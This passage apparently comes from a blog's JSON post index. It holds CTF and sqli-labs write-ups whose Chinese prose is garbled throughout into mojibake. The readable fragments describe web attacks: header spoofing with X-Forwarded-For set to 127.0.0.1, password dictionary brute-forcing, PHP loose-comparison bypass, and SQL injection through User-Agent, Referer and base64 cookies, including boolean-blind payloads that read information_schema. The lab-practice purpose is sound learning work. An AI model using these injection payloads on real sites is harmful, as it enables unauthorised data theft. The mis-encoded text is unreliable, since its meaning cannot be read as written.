¡èµ›è¦å¼€å§‹äº†ï¼Œå°±åšäº†äº›ç®€å•çš„é¢˜ç›®ç»ƒæ‰‹ï¼Œæœ‰bugkuä¹Ÿæœ‰æ”»é˜²ä¸–ç•Œçš„ï¼Œè¿™ç¯‡åšå®¢è®°å½•å‡ é¢˜bugkuçš„é¢˜ã€‚ æ»‘ç¨½çœ‹å›¾å®åœ¨è´¹çœ¼ç›ï¼Œç›´æ¥f12æŸ¥çœ‹æºç æ‰¾åˆ°flagèµ°äººå°±è¡Œäº† è®¡ç®—å™¨å¯ä»¥çœ‹åˆ°è¿›å…¥é¡µé¢åæ˜¯ä¸€é“éå¸¸ç®€å•çš„è®¡ç®—é¢˜ï¼Œç­”æ¡ˆä¸€çœ¼å°±èƒ½çœ‹å‡ºæ˜¯70ï¼Œä½†æ˜¯æˆ‘ä»¬æ‰“ç®—è¾“å…¥æ—¶å´å‘ç°ï¼Œæˆ‘ä»¬åªèƒ½è¾“å…¥ä¸€ä¸ªæ•°å­—ã€‚ä½¿ç”¨f12æŸ¥çœ‹æºç ï¼Œå‘ç°äº†è¿™ä¹ˆä¸€è¡Œï¼š&lt;input type=&quot;text&quot; class=&quot;input&quot; maxlength=&quot;1&quot;&gt; è¾“å…¥çš„æœ€å¤§é•¿åº¦ä¸º1ï¼Œé‚£ä¹ˆæˆ‘ä»¬æŠŠ1æ”¹æˆ2ï¼Œå†è¾“å…¥è¿›è¡ŒéªŒè¯å°±å¯ä»¥å¾—åˆ°flagäº†ã€‚ GET &amp;&amp; POSTéå¸¸ç›´ç™½çš„é¢˜ç›®ï¼Œè¿™ä¸¤é¢˜çš„é¡µé¢éƒ½æä¾›äº†phpä»£ç ï¼Œåˆ†åˆ«ä»¥getå’Œpostä¸Šä¼ ä¸€ä¸ªwaht=flagï¼Œflagå°±ä¼šå›æ˜¾å‡ºæ¥äº† çŸ›ç›¾æˆ‘ä»¬åˆ†æè¿™é¢˜çš„ä»£ç ï¼Œå¯ä»¥çŸ¥é“æˆ‘ä»¬éœ€è¦ä»¥getçš„æ–¹å¼ä¸Šä¼ ä¸€ä¸ªæ•°å€¼ä¸º1çš„éæ•°å­—ï¼Œè¿™æ ·çœ‹æ¥ç¡®å®æ˜¯çŸ›ç›¾çš„ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥å‘ç°è¿™é‡Œçš„åˆ¤æ–­ç¬¦ä¸º==è€Œå¹¶é===ï¼Œå› æ­¤ä¸æ¯”è¾ƒä¸¤ä¸ªå˜é‡çš„ç±»å‹ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è¾“å…¥å­—ç¬¦ä¸²è€Œå¹¶éæ•°å­—æ¥è¿›è¡Œåˆ¤æ–­ã€‚è¿™é‡Œæˆ‘ä»¬getä¼ å…¥ä¸€ä¸ªnum=1aå°±å¯ä»¥äº† å¤´ç­‰èˆ±webä¸­ä¸å¤´ç›¸å…³æˆ‘ä»¬é¦–å…ˆæƒ³åˆ°çš„å°±æ˜¯å“åº”å¤´å’Œè¯·æ±‚å¤´äº†ï¼Œå› æ­¤è¿™é¢˜ç›´æ¥æŸ¥çœ‹ç½‘é¡µçš„å“åº”å¤´ï¼Œå‘ç°flagå°±åœ¨å…¶ä¸­ã€‚ ç½‘ç«™è¢«é»‘è¿™é¢˜ä¸€è¿›å»æˆ‘ä»¬æŸ¥çœ‹æºç ï¼ŒæŠ“åŒ…ç­‰éƒ½ä¸€æ— æ‰€è·ï¼Œå› æ­¤æˆ‘ä»¬è¦æƒ³åˆ°å¯¹ç½‘é¡µè¿›è¡Œè·¯å¾„æ‰«æï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨äº†å¾¡å‰‘è¿›è¡Œæ‰«æï¼Œå‘ç°äº†shell.phpï¼Œä¹Ÿå°±æ˜¯è¢«äººä¸Šä¼ æœ¨é©¬äº†ã€‚ æˆ‘ä»¬è¿›å…¥shell.phpï¼Œå‘ç°éœ€è¦å¯†ç ï¼Œå¦‚æœä½ èƒ½çµæœºä¸€åŠ¨çŒœå‡ºå¯†ç æ˜¯hackçš„è¯ï¼Œé‚£æ­å–œä½ ï¼Œå¾—åˆ°äº†flagï¼Œå¦åˆ™çš„è¯è¿˜æ˜¯è€è€å®å®è¿›è¡Œå­—å…¸çˆ†ç ´å§ã€‚ ä½ å¿…é¡»è®©ä»–åœä¸‹è¿›å…¥é¡µé¢åå‘ç°é¡µé¢ä¸€ç›´åœ¨åˆ·æ–°ï¼Œä½†æ˜¯åœ¨æŸ¥çœ‹æºç æ—¶å¯ä»¥å‘ç°æœ‰ä¸€æ¬¡åˆ·æ–°æ˜¯å¯ä»¥æ˜¾ç¤ºflagçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è€å¿ƒæŠ“åŒ…ï¼ŒæŠ“åˆ°flagå°±ç®—æˆåŠŸã€‚ æœ¬åœ°ç®¡ç†å‘˜è¿›å…¥é¡µé¢å‘ç°è¦è¾“å…¥è´¦å·å¯†ç ï¼Œå°è¯•è¾“å…¥åå‘ç°ipç¦æ­¢è®¿é—®ï¼Œæˆ‘ä»¬é€šè¿‡æŠ“åŒ…æ·»åŠ ä¸€ä¸ªxxfçš„è¯·æ±‚å¤´ï¼Œå°†å…¶è®¾ç½®ä¸º127.0.0.1ï¼Œæ¥ç€æç¤ºäº†æ— æ•ˆå‡­è¯ï¼Œé‚£ä¹ˆä¼°è®¡å°±æ˜¯å¯†ç çš„é—®é¢˜äº†ï¼Œçˆ†ç ´å¯†ç ç›´æ¥æ— è„‘å­—å…¸ï¼Œçˆ†å‡ºæ¥å¯†ç ä¸ºtest123ï¼Œæœ€åç™»å½•è·å–flagã€‚ æ€»ç»“ä»¥ä¸Šå…«é¢˜éƒ½æ˜¯æ¯”è¾ƒç®€å•çš„é¢˜ç›®ï¼Œä¸»è¦æ¥è§¦äº†ctfé¢˜ç›®çš„ç±»å‹ä¸è§£é¢˜æ€è·¯ï¼Œä¸ºå‘¨å…­çš„æ ¡èµ›åšå‡†å¤‡ã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"}]},{"title":"sqli-labsç»ƒä¹ -less18-22","slug":"sqli-labsç»ƒä¹ -less18-22","date":"2021-10-07T12:05:42.000Z","updated":"2021-11-19T14:50:36.272Z","comments":true,"path":"2021/10/07/sqli-labsç»ƒä¹ -less18-22/","link":"","permalink":"http://example.com/2021/10/07/sqli-labs%E7%BB%83%E4%B9%A0-less18-22/","excerpt":"å‰è¨€æ¥ä¸‹æ¥çš„å‡ å…³æˆ‘ä»¬éœ€è¦ç”¨åˆ°æŠ“åŒ…å·¥å…·æ¥å¸®åŠ©æˆ‘ä»¬è¿›è¡Œè§£é¢˜ï¼Œæˆ‘ä»¬ç”¨åˆ°äº†burp suiteå·¥å…·ï¼ˆéœ€è¦JAVAç¯å¢ƒï¼‰ï¼Œå¹¶ä¸”é€šè¿‡ä¸‹é¢å‡ ä¸ªé¶åœºå…·ä½“åˆ†æå­¦ä¹ è¿™ä¸ªå·¥å…·çš„ä½¿ç”¨ã€‚ps.æ•´ç†äº†å…³äºsqli-labsé¶åœºçš„åšå®¢ï¼Œå°†åˆ†æ•£çš„å‡ ç¯‡æ•´åˆäº†èµ·æ¥ã€‚","text":"å‰è¨€æ¥ä¸‹æ¥çš„å‡ å…³æˆ‘ä»¬éœ€è¦ç”¨åˆ°æŠ“åŒ…å·¥å…·æ¥å¸®åŠ©æˆ‘ä»¬è¿›è¡Œè§£é¢˜ï¼Œæˆ‘ä»¬ç”¨åˆ°äº†burp suiteå·¥å…·ï¼ˆéœ€è¦JAVAç¯å¢ƒï¼‰ï¼Œå¹¶ä¸”é€šè¿‡ä¸‹é¢å‡ ä¸ªé¶åœºå…·ä½“åˆ†æå­¦ä¹ è¿™ä¸ªå·¥å…·çš„ä½¿ç”¨ã€‚ps.æ•´ç†äº†å…³äºsqli-labsé¶åœºçš„åšå®¢ï¼Œå°†åˆ†æ•£çš„å‡ ç¯‡æ•´åˆäº†èµ·æ¥ã€‚ less-18é¦–å…ˆè¿›å…¥ç½‘é¡µï¼Œæˆ‘ä»¬å‘ç°æ˜¾ç¤ºäº†å½“å‰çš„ipåœ°å€ï¼Œä½†è¿™ä¼¼ä¹å¯¹æˆ‘ä»¬å¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ã€‚ä¾ç„¶å°è¯•éšä¾¿è¾“å…¥ï¼Œå‘ç°æç¤ºç™»å½•å¤±è´¥ï¼Œç®€å•æ³¨å…¥ä¹Ÿæ²¡æœ‰æŠ¥é”™å›æ˜¾ã€‚æˆ‘ä»¬å»æŸ¥çœ‹ä¸‹æºç ï¼Œå‘ç°è´¦æˆ·å¯†ç éƒ½è¢«check_inputå‡½æ•°ä¿æŠ¤èµ·æ¥äº†ï¼Œå› æ­¤æˆ‘ä»¬æ˜¾ç„¶ä¸èƒ½åœ¨è¿™ä¸ªé¡µé¢ä¸­è¿›è¡Œæ³¨å…¥äº†ã€‚ æ—¢ç„¶é¡µé¢ä¸èƒ½æ³¨å…¥ï¼Œæˆ‘ä»¬å°±è¿›è¡ŒæŠ“åŒ…æ“ä½œï¼Œå…ˆéšæ„è¾“å…¥ä¸€ç»„è´¦å·å¯†ç ï¼Œå¾—åˆ°æŠ“åŒ…ç»“æœï¼š æƒ³è¦è¿›è¡Œæ³¨å…¥æ“ä½œï¼Œæˆ‘ä»¬å°±è¦å…ˆäº†è§£è¿™äº›è¯·æ±‚å¤´çš„å«ä¹‰ï¼Œè¿™é‡Œä¸¾å‡ ä¸ªå¸¸ç”¨çš„è¯·æ±‚å¤´ä¸ºä¾‹ï¼š HOSTï¼šæŒ‡å®šè¢«è¯·æ±‚èµ„æºçš„Internetä¸»æœºä¸ç«¯å£å· User-Agentï¼šå…è®¸å®¢æˆ·ç«¯å°†æ“ä½œç³»ç»Ÿã€æµè§ˆå™¨ç­‰ä¿¡æ¯æŠ¥å‘Šç»™æœåŠ¡å™¨ Refererï¼šå½“å‰è®¿é—®çš„URLçš„ä¸Šä¸€ä¸ªURL X-Forwarded-Forï¼šè¯·æ±‚ç«¯IP Cookieï¼šä¸€æ®µæ–‡æœ¬ï¼Œä¸€èˆ¬ç”¨æ¥å‚¨å­˜ç”¨æˆ·èµ„æ–™ï¼Œç›¸å½“é‡è¦ ä¸è¿‡åœ¨è¿™é‡Œæˆ‘ä»¬ä¼¼ä¹æ‰¾ä¸åˆ°æ³¨å…¥ç‚¹ï¼Œé‚£æˆ‘ä»¬è¯•ç€è¾“å…¥ä¸€æ®µæ­£ç¡®çš„è´¦æˆ·å¯†ç ã€‚æˆ‘ä»¬è¿™é‡Œæœ‰ä¸¤ç§æ“ä½œï¼š æˆ‘ä»¬åœ¨Proxyä¸‹ç›´æ¥æ›´æ”¹è´¦æˆ·å¯†ç å¹¶å°†å…¶forwardï¼Œæˆ‘ä»¬å¯ä»¥å›åˆ°æµè§ˆå™¨æŸ¥çœ‹ç»“æœ æˆ‘ä»¬ä½¿ç”¨ctrl+rå°†å…¶å‘é€åˆ°Repeaterä¸­ï¼Œåœ¨å¹¶requestä¸­ä¿®æ”¹è´¦æˆ·å¯†ç ï¼Œå°†å…¶goåˆ°responseä¸­ï¼Œå¹¶åœ¨responseä¸­çš„renderä¸‹æŸ¥çœ‹ç»“æœ è¿™é‡Œæˆ‘ä»¬é€‰æ–¹æ³•2ï¼špsï¼šè¿™é‡Œå¯†ç ä¸º123456æ˜¯å› ä¸ºåœ¨åš24å…³çš„æ—¶å€™æ”¹å¯†äº†ï¼Œæ­£å¸¸å¯†ç åº”è¯¥ä¹Ÿä¸ºadmin æˆ‘ä»¬å¯ä»¥å‘ç°è¿™æ—¶è¿”å›äº†User-Agentï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æºç åˆ†æè¿™æ®µçš„æ³¨å…¥åŸç†ï¼š$insert=&quot;INSERT INTO &#39;security&#39;.&#39;uagents&#39; (&#39;uagent&#39;, &#39;ip_address&#39;, &#39;username&#39;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;; è¿™æ®µä»£ç ä¾¿æ˜¯æˆ‘ä»¬æ³¨å…¥çš„å…³é”®ï¼Œè¿™ä¸€æ¬¡ä¸æ˜¯selectè¯­å¥ï¼Œè€Œæ˜¯insertè¯­å¥ã€‚è¿™æ®µä»£ç ä¼šåœ¨ç™»é™†æˆåŠŸåå›æ˜¾uagentï¼Œå¹¶å°†uagentã€IPã€unameæ’å…¥åˆ°securityæ•°æ®åº“çš„uagentsè¡¨çš„uagentã€ip_addressã€usernameä¸‰ä¸ªå­—æ®µä¸­ã€‚å¹¶ä¸”ç»“åˆå…¶ä»–ä»£ç æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œåªæœ‰è¾“å…¥æ­£ç¡®çš„è´¦å·å¯†ç æ‰èƒ½è¿›å…¥åˆ°è¿™ä¸ªinsertè¯­å¥ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ¤æ–­æ³¨å…¥ç‚¹å°±åœ¨User-Agentä¸­ã€‚ æ‰¾åˆ°æ³¨å…¥ç‚¹åï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¹‹å‰ä½¿ç”¨è¿‡çš„å¾ˆå¤šè¯­å¥è¿›è¡Œçˆ†åº“äº†ï¼šè¿˜å¯ä»¥ä½¿ç”¨æ—¶é—´ç›²æ³¨æˆ–è€…å…¶ä»–ç±»å‹çš„æŠ¥é”™ç­‰ç­‰ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚ less-19åä¹å…³ä¸åå…«å…³çš„å·®åˆ«ä¸å¤§ï¼Œè¾“å…¥adminå‘ç°è¿™æ¬¡å›æ˜¾çš„æ˜¯Refererå†…å®¹ï¼Œé‚£æˆ‘ä»¬å°±çŒœæµ‹æ³¨å…¥ç‚¹åœ¨refererä¸­ï¼Œé€šè¿‡æŸ¥è¯¢æºç å‘ç°ä¹Ÿç¡®å®å¦‚æ­¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œçˆ†åº“äº†ã€‚ less-20é€šè¿‡æ ‡é¢˜æç¤ºæˆ‘ä»¬çŸ¥é“è¿™é“é¢˜çš„å…³é”®åœ¨äºcookieä¸Šã€‚æˆ‘ä»¬å…ˆå»æŸ¥çœ‹ä¸€æ³¢æºç ï¼Œå‘ç°è¿™æ¬¡çš„selectè¯­å¥å¯¹$cookieè¿›è¡Œäº†æŸ¥è¯¢ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¤§å¯åˆ¤æ–­è¿™æ¬¡çš„æ³¨å…¥ç‚¹åœ¨cookieä¸­ã€‚ æˆ‘ä»¬æ¥å…ˆåˆ†æburp suiteæ˜¯å¦‚ä½•è¿›è¡Œè¿™å…³çš„æŠ“åŒ…çš„ï¼šé¦–å…ˆå…ˆéªŒè¯è´¦æˆ·å¯†ç æ˜¯å¦æ­£ç¡®ï¼Œå¦‚æœæ­£ç¡®çš„è¯å°±è¿›è¡Œset cookie æ¥ä¸‹æ¥forwardä¹‹åæˆ‘ä»¬å°±å¯ä»¥å‘ç°cookieå·²ç»è¢«è®°å½•äº†ä¸‹æ¥ï¼šåŒæ—¶æˆ‘ä»¬å¾—çŸ¥cookieåªè®°å½•ä¸‹äº†unameï¼Œè¿™æ—¶æˆ‘ä»¬ä¿®æ”¹cookieä¸º1ï¼Œç”¨æµè§ˆå™¨å¼€å‘è€…å·¥å…·è¯»å–cookieï¼Œå‘ç°adminä¾ç„¶ä¿å­˜åœ¨valueå€¼ä¸­ã€‚æˆ‘ä»¬å°±å¯ä»¥åˆ¤æ–­å½“é¡µé¢requestæ—¶ï¼Œè‹¥cookieä¸­å­˜åœ¨unameåˆ™ç›´æ¥è¯»å–ï¼Œå› æ­¤è¿™é¢˜æ³¨å…¥ç‚¹å°±åœ¨cookieä¸­ã€‚ æ‰¾åˆ°äº†æ³¨å…¥ç‚¹ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¼€å§‹å¹³å¹³æ— å¥‡çš„çˆ†åº“äº†ï¼Œç›´æ¥ç®€å•çš„æŸ¥è¯¢è¯­å¥åŠ æ³¨é‡Šå°±è¡Œã€‚ less21-22åˆ°è¿™é‡Œæˆ‘ä»¬å°±è¿›å…¥äº†é¶åœºçš„ç¬¬äºŒé¡µäº†ï¼Œæ­å–œè‡ªå·±èƒ½æ›´è¿›ä¸€æ­¥äº†ã€‚æˆ‘ä»¬è¿›å…¥21å…³ï¼ŒåŸºäºbase64çš„cookieæ³¨å…¥ã€‚è¿™é‡Œå…³äºbase64çš„çŸ¥è¯†å¯ä»¥å‚è€ƒä¸‹é¢è¿™ä¸ªæ–‡ç« ï¼šbase64ä»‹ç» æˆ‘ä»¬é¦–å…ˆç”¨burp suiteè¿›è¡ŒæŠ“åŒ…ï¼Œå‘ç°è¿™æ¬¡çš„cookieä¸­å‡ºç°äº†è¿™æ®µä»£ç ï¼šCookie: uname=YWRtaW4%3Dè¿™é‡Œçš„%3Då°±æ˜¯â€œ=â€ï¼Œè¿™æ˜¯ä¸€æ®µå¾ˆç»å…¸çš„base64ï¼Œä¸è¿‡æˆ‘ä»¬è‡ªç„¶ä¸ç”¨ä¸€ä¸ªä¸ªè‡ªå·±è§£ç ï¼Œburp suiteä¸­çš„Decoderæ¨¡å—ä¸­çš„decode aså°±å¯ä»¥è¿›è¡Œbase64çš„ç¼–ç ä¸è§£ç ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å…ˆè¿›è¡Œè§£ç ï¼Œç»“æœä¸ºadminã€‚ ä¸è¿‡è¿™é¢˜åŒç¬¬20å…³çš„åŒºåˆ«ä¹Ÿå°±åœ¨è¿™é‡Œäº†ï¼Œå…¶ä»–çš„æ“ä½œä¸20å…³å¹¶æ— ç›¸å¼‚ï¼Œæ³¨æ„æ³¨å…¥æ˜¯å¦æœ‰æ‹¬å·ï¼Œæ¥ç€æˆ‘ä»¬åªè¦å°†åŸæ¥è¾“å…¥çš„ä»£ç å…ˆè¿›æ€§base64ç¼–ç å†æ³¨å…¥å°±è¡Œäº†ã€‚ è€Œç¬¬22å…³æ˜¯åŸºäºåŒå¼•å·çš„æŠ¥é”™ï¼Œåªè¦ä½¿ç”¨åŒå¼•å·å°±è¡Œäº†","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -mysql","slug":"web-mysql","permalink":"http://example.com/tags/web-mysql/"}]},{"title":"sqli-labsç»ƒä¹ -less8-17","slug":"sqli-labsç»ƒä¹ -less8-17","date":"2021-10-02T04:56:56.000Z","updated":"2021-11-19T14:50:42.412Z","comments":true,"path":"2021/10/02/sqli-labsç»ƒä¹ -less8-17/","link":"","permalink":"http://example.com/2021/10/02/sqli-labs%E7%BB%83%E4%B9%A0-less8-17/","excerpt":"å‰è¨€æ¥ä¸‹æ¥çš„ä¸‰å…³å°±æ˜¯ç›²æ³¨é¢˜äº†ï¼Œç›²æ³¨æ˜¯SQLæ³¨å…¥ä¸­æœ€é‡è¦çš„æŠ€èƒ½ï¼Œå½“é¡µé¢ä¸­çš„æ•°æ®æ— æ³•å›æ˜¾åˆ°å‰ç«¯æ—¶ï¼Œå°±éœ€è¦å€ŸåŠ©ç›²æ³¨æ‰‹æ®µæ¥åˆ¤æ–­ã€‚åŒæ—¶ï¼Œç›²æ³¨å¾€å¾€ä¹Ÿå¸¦æœ‰ç€å·¥å…·æˆ–è„šæœ¬çš„ä½¿ç”¨ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å€Ÿæ­¤æœºä¼šè¿›è¡Œå­¦ä¹ ã€‚ps.æ•´ç†äº†å…³äºsqli-labsé¶åœºçš„åšå®¢ï¼Œå°†åˆ†æ•£çš„å‡ ç¯‡æ•´åˆäº†èµ·æ¥ã€‚","text":"å‰è¨€æ¥ä¸‹æ¥çš„ä¸‰å…³å°±æ˜¯ç›²æ³¨é¢˜äº†ï¼Œç›²æ³¨æ˜¯SQLæ³¨å…¥ä¸­æœ€é‡è¦çš„æŠ€èƒ½ï¼Œå½“é¡µé¢ä¸­çš„æ•°æ®æ— æ³•å›æ˜¾åˆ°å‰ç«¯æ—¶ï¼Œå°±éœ€è¦å€ŸåŠ©ç›²æ³¨æ‰‹æ®µæ¥åˆ¤æ–­ã€‚åŒæ—¶ï¼Œç›²æ³¨å¾€å¾€ä¹Ÿå¸¦æœ‰ç€å·¥å…·æˆ–è„šæœ¬çš„ä½¿ç”¨ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å€Ÿæ­¤æœºä¼šè¿›è¡Œå­¦ä¹ ã€‚ps.æ•´ç†äº†å…³äºsqli-labsé¶åœºçš„åšå®¢ï¼Œå°†åˆ†æ•£çš„å‡ ç¯‡æ•´åˆäº†èµ·æ¥ã€‚ å…³äºç›²æ³¨ç›²æ³¨çš„ä½¿ç”¨è¦åŸºäºç”¨æˆ·è‡ªå·±å¯ä»¥å¯¹è¾“å…¥è¿›è¡Œæ§åˆ¶ï¼Œä¸”è¦èƒ½æ¥å…¥è¿›æ‰§è¡Œä»£ç ä¸­ã€‚ç›²æ³¨åˆ†ä¸ºä¸¤ç§ï¼šå¸ƒå°”ç›²æ³¨å’Œæ—¶é—´ç›²æ³¨ã€‚ å¸ƒå°”ç›²æ³¨ï¼šé€šè¿‡è¿”å›trueä¸falseçš„ä¸åŒï¼Œå¯¼è‡´é¡µé¢çš„å›æ˜¾ä¸åŒè¿›è¡Œåˆ¤æ–­ï¼Œä¹‹å‰ä½¿ç”¨and 1=1ä¸and 1=2åˆ¤æ–­æ³¨å…¥ç‚¹ä¹Ÿæ˜¯ç”¨æ­¤åŸç† æ—¶é—´ç›²æ³¨ï¼šé€šè¿‡è¿”å›trueä¸falseçš„ä¸åŒï¼Œå¯¼è‡´é¡µé¢çš„åŠ è½½æ—¶é—´ä¸åŒè¿›è¡Œåˆ¤æ–­ï¼Œä¸€èˆ¬ä½¿ç”¨ifè¯­å¥ less-8æ ‡é¢˜å°±æ˜¯åŸºäºå•å¼•å·çš„å¸ƒå°”ç›²æ³¨ï¼Œé‚£æˆ‘ä»¬å…ˆå°†idå’Œå•å¼•å·ä¸€èµ·è¾“å…¥è¿›å»ï¼Œç„¶åå‘ç°è¿™æ˜¯ä¸€ç‚¹æŠ¥é”™éƒ½æ²¡æœ‰å•Šã€‚æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹æºç ï¼Œå‘ç°æŠ¥é”™è¿™ä¸€è¡Œï¼ˆä¸‹åˆ—æºç çš„ç¬¬ä¸‰è¡Œï¼‰è¢«æ³¨é‡Šäº†ï¼š 123456echo &#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;;//echo &#x27;You are in...........&#x27;;//print_r(mysql_error());//echo &quot;You have an error in your SQL syntax&quot;;echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;; é‚£ä¹ˆè¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨ç›²æ³¨äº†ã€‚å…ˆç”¨and 1=1å’Œand 1=2åˆ¤æ–­ï¼Œå‘ç°å‰è€…ä¼šå›æ˜¾ä¸€ä¸ªâ€œYou are inâ€¦.â€ï¼Œè€Œåè€…ä¾ç„¶æ˜¯ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±çŸ¥é“äº†ï¼Œå½“è¿”å›trueæ—¶ï¼Œé¡µé¢ä¼šå›æ˜¾ä¸€å¥è¯ï¼Œåä¹‹åˆ™ä»€ä¹ˆéƒ½ä¸å›æ˜¾ã€‚ æ—¢ç„¶æŒæ¡äº†åŸç†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å¼€å§‹å‡†å¤‡æ³¨å…¥äº†ã€‚ä¸‹é¢æˆ‘ä»¬æ¥ä»‹ç»æˆ‘ä»¬éœ€è¦ç”¨åˆ°çš„å‡½æ•°ï¼š length()ï¼šè¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ substr(str,start,len):æˆªå–â€œstrâ€å­—ç¬¦ä¸²ä»ç¬¬â€œstartâ€ä½å¼€å§‹çš„â€œlenâ€é•¿åº¦çš„å­—ç¬¦ ascii()ï¼šè¿”å›å­—ç¬¦çš„asciiç å€¼ï¼Œå…³äºasciiç å€¼å¯ä»¥å‚è€ƒä¸‹å›¾ï¼š æ­£å¼å¼€å§‹æ³¨å…¥ï¼Œæˆ‘ä»¬ä½¿ç”¨andæˆ–è€…oræ¥å¯¹ä»£ç è¿›è¡Œè¿æ¥ï¼Œä¸€å®šè¦æ³¨æ„ï¼Œandçš„trueè¿”å›æ¡ä»¶æ˜¯å·¦å³ä¸¤è¾¹éƒ½ä¸ºçœŸï¼Œorçš„trueè¿”å›æ¡ä»¶åªéœ€è¦æœ‰ä¸€è¾¹ä¸ºçœŸå°±è¡Œäº†ï¼Œå› æ­¤åœ¨è¿™é‡Œå‰é¢idå¦‚æœå­˜åœ¨äºæ•°æ®åº“ä¹‹ä¸­è¦ç”¨andï¼Œä¸å­˜åœ¨åˆ™ç”¨orã€‚ç”±äºåˆ·POSTé¢˜æ—¶çŠ¯äº†ä¸ªè ¢ï¼Œåœ¨è¿™é‡Œå…ˆæä¸€ä¸‹ã€‚ ç”±äºæˆ‘ä»¬å·²ç»çŸ¥é“æ•°æ®åº“çš„åç§°ä¸ºsecurityäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ä¸ä»çŒœæ•°æ®åº“å¼€å§‹äº†ï¼Œå¯ä»¥ç”¨length(database())å…ˆç¡®å®šæ•°æ®åº“åç§°çš„é•¿åº¦ï¼Œå†ä¸€ä½ä¸€ä½è¿›è¡ŒçŒœæµ‹ã€‚è¿™é‡Œæˆ‘ä»¬ç›´æ¥å¼€å§‹çŒœè¡¨ã€‚é¦–å…ˆæ˜¯è¡¨çš„ä¸ªæ•°ï¼š 1n=(select count(table_name) from information_schema.tables where table_schema=&#x27;æ•°æ®åº“å&#x27;) nå¯ä»¥æ›¿æ¢ä¸ºä»»ä½•æ•°ï¼Œåé¢çš„æŸ¥è¯¢è¯­å¥ä¹Ÿå¯ä»¥æ›¿æ¢æ¥æŸ¥è¯¢è¡¨çš„åˆ—æ•°ç­‰ç­‰ã€‚å½“è¿”å›trueæ—¶ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çœ‹åˆ°â€œYou are inâ€¦.â€æ—¶ï¼Œä»£è¡¨ç€æˆ‘ä»¬çŒœå¯¹äº†ï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œä¸‹ä¸€æ­¥çŒœè¡¨åäº†ï¼š 1ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),m,1))=n è¿™é‡Œæˆ‘ä»¬ç”¨limité™åˆ¶äº†æŸ¥è¯¢çš„è¡¨ä¸ºæ•°æ®åº“ä¸­çš„ç¬¬ä¸€ä¸ªè¡¨ï¼Œè¿™ä¸ªå‡½æ•°éªŒè¯çš„æ˜¯ç¬¬ä¸€ä¸ªè¡¨çš„ç¬¬mä¸ªå­—æ®µçš„asciiç æ˜¯å¦ä¸ºnï¼Œè¿™ä¸ªç­‰å·ä¹Ÿå¯ä»¥æ›¿æ¢ä¸ºå¤§äºå·æˆ–è€…å°äºå·æ¥å¸®åŠ©æˆ‘ä»¬ç¼©å°èŒƒå›´ã€‚é€šè¿‡è¿™ç§æ–¹æ³•æˆ‘ä»¬å¯ä»¥é€æ­¥æ¨å‡ºç¬¬ä¸€ä¸ªè¡¨çš„åå­—ä¸ºemaliã€‚ä½†æ˜¯ä¸€ä¸ªä¸ªè¯•çš„æ•ˆç‡æ˜¯ååˆ†ä½çš„ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨äºŒåˆ†æ³•æ¥æé«˜æ•ˆç‡ï¼Œæˆ–è€…å­¦ä¹ å¦‚ä½•ä½¿ç”¨è„šæœ¬æˆ–è€…å·¥å…·æ¥å¸®åŠ©æˆ‘ä»¬æé«˜æ•ˆç‡ï¼Œè¿™é‡Œå°±ä¸å±•å¼€äº†ã€‚ å¾—åˆ°è¡¨çš„åç§°åï¼Œæˆ‘ä»¬å¯ä»¥æ›´æ”¹ä»¥ä¸Šä»£ç çš„æŸ¥è¯¢è¯­å¥ä¸€æ­¥æ­¥æŸ¥è¯¢å‡ºæˆ‘ä»¬æƒ³è¦çš„æ•°æ®äº†ã€‚ less-9è¿™å…³æ ¹æ®æ ‡é¢˜è¦ä½¿ç”¨æ—¶é—´ç›²æ³¨ï¼Œä½†æˆ‘å…ˆç”¨äº†å¸ƒå°”ç›²æ³¨è¿›è¡Œæµ‹è¯•ï¼Œç»“æœå‘ç°æ— è®ºè¿”å›trueè¿˜æ˜¯falseï¼Œé¡µé¢éƒ½ä¼šå›æ˜¾â€œYou are inâ€¦.â€ï¼ŒæŸ¥çœ‹æºç å°±å¯ä»¥å‘ç°ç¡®å®å¦‚æ­¤ï¼Œå› æ­¤è¿™ä¸ªé¶åœºæˆ‘ä»¬å°±è¦ä½¿ç”¨æ—¶é—´ç›²æ³¨äº†ã€‚ ä½¿ç”¨æ—¶é—´ç›²æ³¨æ—¶æˆ‘ä»¬ä¼šç”¨åˆ°ifè¯­å¥å’Œsleep()å‡½æ•°è¿›è¡Œé…åˆï¼š 